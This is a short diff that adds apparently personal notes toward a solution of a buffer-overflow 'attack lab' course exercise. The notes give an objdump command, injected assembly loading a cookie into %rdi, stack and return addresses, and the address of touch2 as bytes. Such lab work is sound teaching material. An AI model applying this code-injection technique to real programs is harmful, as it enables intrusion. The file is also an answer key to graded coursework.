@@ -1,0 +1,18 @@
+objdump -d solution2-asm.o > throw.d
+
+// cookie move code
+mov $0x381e8305, %rdi
+ret
+
+
+rsp
+0x55611eb0
+
+// cookie = 0x381e8305
+
+
+buffer return address: 0x55611e78
+
+
+// address of touch2
+a2 15 40
